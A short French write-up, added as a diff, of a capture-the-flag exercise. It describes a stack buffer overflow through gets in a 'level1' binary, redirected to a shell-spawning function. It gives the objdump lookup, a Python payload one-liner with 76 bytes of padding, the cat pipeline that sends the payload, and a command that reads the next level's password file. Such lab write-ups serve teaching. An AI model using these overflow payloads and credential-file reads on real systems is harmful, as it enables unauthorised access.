@@ -1,0 +1,25 @@
+On a désassemblé le binaire et on a trouvé deux fonction le main et la fonction run.
+On s'est ensuite occupé du main et on a vu qu'il mettait une chaine de cararteres dans un char [64]
+
+Cette chaine de caractere est lue depuis l'entree standard à l'aide d'un appel non sécurisé à gets.
+On peut donc se servir de cet appel pour réécrire l'adresse de retour du main situé plus bas dans la stack.
+
+On a trouvé qu'en ecrivant 76 dans le buffer caracteres on pouvait réécrire l'adresse de retour du main.
+
+Nous avons ensuite remarqué la fonction run qui lance un shell.
+
+On peut donc réécrire l'adresse de retour du main pour atteindre la fonction run.
+
+Avec objdump on trouve que l'adresse de run est 08048444.
+	objdump -d level1  | grep run
+
+On se sert donc de python pour ecrire cette adresse en little endian avec 76 caracteres devant :
+	python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb' + '\x44' + '\x84' + '\x04' + '\x08'"
+
+On ecrit cela dans un fichier dans /tmp :
+	python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb' + '\x44' + '\x84' + '\x04' + '\x08'"	 > /tmp/a
+
+Puis on se sert de cat pour envoyer ça dans l'entree standard du programme tout en gardant cette entree ouverte pour pouvoir ecrir dans le shell qui nous sera donné.
+
+cat /tmp/a -  | ./level1
+cat /home/user/level2/.pass
